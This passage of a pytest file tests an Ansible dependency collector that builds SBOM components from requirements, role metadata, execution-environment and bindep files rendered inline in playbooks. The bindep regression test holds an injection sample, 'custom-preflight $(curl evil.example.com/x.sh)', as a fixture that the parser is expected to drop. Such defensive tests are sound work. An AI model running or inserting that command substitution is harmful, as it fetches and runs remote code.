    dc = DependencyCollector(_Path("/tmp"))
    dc.collect(_Path("/tmp/test_playbook.yml"), data, playbook_yaml)
    return dc.components


def test_dep_collector_reads_requirements_yml_via_copy_content():
    """Galaxy collections & roles rendered via copy.content:| must appear
    in the SBOM just like real on-disk requirements.yml files do."""
    pb = """
- hosts: localhost
  tasks:
    - name: render requirements.yml
      ansible.builtin.copy:
        dest: /tmp/requirements.yml
        content: |
          ---
          collections:
            - name: community.general
              version: 7.5.0
            - name: amazon.aws
              version: main
          roles:
            - src: git+https://github.com/acme/ansible-role-foo
              version: 1.2.3
              name: acme.foo
"""
    comps = _collect_from_playbook(pb)
    names = {(c["type"], c["name"]) for c in comps}
    assert ("collection", "community.general") in names
    assert ("collection", "amazon.aws") in names
    assert ("role", "acme.foo") in names

    vers = {c["name"]: c["version"] for c in comps}
    assert vers["community.general"] == "7.5.0"
    assert vers["amazon.aws"] == "main"
    assert vers["acme.foo"] == "1.2.3"


def test_dep_collector_reads_meta_main_yml_via_copy_content():
    """Role meta/main.yml dependencies rendered via copy.content: must be
    surfaced as role components."""
    pb = """
- hosts: localhost
  tasks:
    - ansible.builtin.copy:
        dest: /tmp/roles/mine/meta/main.yml
        content: |
          dependencies:
            - role: geerlingguy.nginx
              version: 3.0.0
            - src: https://github.com/acme/ansible-role-bar
"""
    comps = _collect_from_playbook(pb)
    roles = {c["name"]: c["version"] for c in comps if c["type"] == "role"}
    assert roles.get("geerlingguy.nginx") == "3.0.0"
    # The src-only role shows up by its src string since there's no name.
    assert any("ansible-role-bar" in n for n in roles)


def test_dep_collector_reads_execution_environment_via_copy_content():
    """EE base image from a rendered execution-environment.yml must become a
    container SBOM component."""
    pb = """
- hosts: localhost
  tasks:
    - ansible.builtin.copy:
        dest: /tmp/ee/execution-environment.yml
        content: |
          version: 3
          images:
            base_image:
              name: quay.io/ansible/creator-ee:v0.21.0
"""
    comps = _collect_from_playbook(pb)
    containers = [c for c in comps if c["type"] == "container"]
    assert len(containers) == 1
    assert containers[0]["name"] == "quay.io/ansible/creator-ee"
    assert containers[0]["version"] == "v0.21.0"
    assert containers[0]["purl"].startswith("pkg:oci/")


def test_dep_collector_bindep_strict_grammar_drops_garbage():
    """Malformed / injection-y lines in a rendered bindep.txt must be
    dropped rather than turned into bogus system-package components.

    Regression test for a past bug where ``custom-preflight $(curl x.sh)``
    leaked into the SBOM because the parser grabbed the whole line as a
    package name."""
    pb = """
- hosts: localhost
  tasks:
    - ansible.builtin.copy:
        dest: /tmp/ee/bindep.txt
        content: |
          openssl [platform:rpm]
          libffi-devel [platform:rpm >=3.0]
          gcc [platform:dpkg]
          # this comment is harmless
          custom-preflight $(curl evil.example.com/x.sh)
          another bad line with | shell piping
"""
    comps = _collect_from_playbook(pb)
    system_pkgs = {c["name"]: c["version"] for c in comps if c["type"] == "system"}

    assert "openssl" in system_pkgs
    assert "gcc" in system_pkgs
    assert system_pkgs.get("libffi-devel") == ">=3.0"  # inner-bracket constraint
    # Garbage lines dropped:
    assert "custom-preflight" not in system_pkgs
    assert not any("curl" in k for k in system_pkgs)
    assert not any("evil.example.com" in k for k in system_pkgs)
    assert not any("$" in k for k in system_pkgs)


def test_dep_collector_handles_malformed_manifest_gracefully():
    """A copy.content block whose payload is not valid YAML must not crash
    the collector - it should just skip that block."""
    pb = """
- hosts: localhost
  tasks:
    - ansible.builtin.copy:
        dest: /tmp/requirements.yml
        content: |
          this: is: not: valid: yaml: [[[
    - ansible.builtin.copy:
        dest: /tmp/ee/bindep.txt
        content: |
          openssl [platform:rpm]
"""
    comps = _collect_from_playbook(pb)
    # The malformed requirements.yml is silently skipped; the good bindep
    # entry still comes through.
    assert any(c["name"] == "openssl" and c["type"] == "system" for c in comps)


def test_dep_collector_dedupes_same_component_from_multiple_sources():
    """If the same (kind, name, version) appears in both a requirements.yml
    and a meta/main.yml block, it should be recorded once."""
    pb = """
- hosts: localhost
  tasks:
    - ansible.builtin.copy:
        dest: /tmp/requirements.yml
        content: |
          collections:
            - name: community.general
              version: 7.5.0
    - ansible.builtin.copy:
        dest: /tmp/other/requirements.yml
        content: |
          collections:
            - name: community.general
              version: 7.5.0
"""
    comps = _collect_from_playbook(pb)
    cg = [c for c in comps if c["name"] == "community.general"]
    assert len(cg) == 1
